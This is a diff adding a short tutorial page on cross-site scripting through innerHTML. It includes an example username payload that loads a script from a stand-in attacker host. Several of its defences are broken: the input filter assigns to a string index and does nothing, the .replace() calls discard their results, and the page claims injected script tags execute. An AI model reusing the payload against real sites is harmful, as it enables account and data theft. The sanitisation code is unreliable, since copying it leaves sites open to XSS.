@@ -1,0 +1,68 @@
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">"Post by "</span> <span class="o">+</span> <span class="nx">username</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>This simple line of code might seem “innocent” and well written, but it can actually cause quite a bit of trouble.</p>
+
+<p>Imagine you have a website where a user can post a video, similar to Youtube, and when they published a video, it would say “Post by “ and then their username under their video.</p>
+
+<p>Their username would be fetched from the backend, and the code above would be used to display the message.</p>
+
+<p>With a regular user this would work perfectly fine, but what if someone wants to hack your website?</p>
+
+<p>What would happen if that person registered an account on your site and made their username <code class="highlighter-rouge">&lt;script src='http://hackerwebsite.com/hack.js'&gt;&lt;/script&gt;</code>?</p>
+
+<p>Well, since you used the innerHTML property, the script in their username would be injected into everyone that viewed that persons video.</p>
+
+<p>Now imagine that hacker made a viral video. Well, millions of people would have that script injected into their computer.</p>
+
+<h3 id="this-sort-of-hack-is-called-cross-site-scripting-or-xss-for-short">This sort of hack is called Cross Site Scripting, or XSS for short.</h3>
+
+<p>It is the most popular hack on the internet, and has affected millions of websites such as Google, Youtube, and Facebook.</p>
+
+<h3 id="so-what-can-you-do-to-protect-yourself">So, what can you do to protect yourself?</h3>
+
+<p>For starters, if there is any data that you are putting in an HTML element via .innerHTML, make sure it is from a trusted source - not a user or other person. If you do have any data from a non-trusted source, you can use the innerText property instead, or the .text() function in jQuery.</p>
+
+<p>Here’s the new code:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">element</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s2">"Post by "</span> <span class="o">+</span> <span class="nx">username</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Furthermore, when a user is registering for your site, block characters such as &lt;, &gt;, (, or ), because regular users don’t need them for normal usernames, and they tend to be used in injected scripts, as well as HTML elements.</p>
+
+<p>Here’s an example of this implemented:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">usernameInput</span><span class="p">.</span><span class="nx">oninput</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+  <span class="c1">// Last character entered</span>
+  <span class="kd">var</span> <span class="nx">enteredChar</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">value</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+
+  <span class="c1">// List of blocked characters</span>
+  <span class="kd">var</span> <span class="nx">charsBlocked</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"&lt;"</span><span class="p">,</span><span class="s2">"&gt;"</span><span class="p">,</span><span class="s2">"("</span><span class="p">,</span><span class="s2">")"</span><span class="p">];</span>
+
+  <span class="c1">// If entered character is blocked</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">charsBlocked</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">enteredChar</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
+    <span class="c1">// Take away entered character</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">value</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>You can also use the .replace() function to simply delete any occurences of <code class="highlighter-rouge">&lt;script&gt;</code> or <code class="highlighter-rouge">&lt;/script&gt;</code> in a string.</p>
+
+<p>For example:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">username</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">"&lt;script&gt;"</span><span class="p">,</span> <span class="s2">""</span><span class="p">);</span>
+<span class="nx">username</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">"&lt;/script&gt;"</span><span class="p">,</span> <span class="s2">""</span><span class="p">);</span>
+<span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">"Post by "</span> <span class="o">+</span> <span class="nx">username</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Cross Site Scripting affects thousands of websites every year.</p>
+
+<p>If your site is vulnerable to XSS attacks, hackers could potentially transmit important data to their servers, such as your entire javascript window object (containing all of your variables and functions), or they could even steal sensitive information such as user passwords, and more.</p>
+
+<p>Whenever you are using .innerHTML, I suggest you check if your site could be vulnerable to XSS attacks, and change your code correspondingly.</p>
+
+<h3 id="anyway-thanks-for-reading">Anyway, thanks for reading!</h3>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">element</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s2">"This site is not vulnerable to XSS attacks."</span><span class="p">;</span>
+</code></pre></div></div>
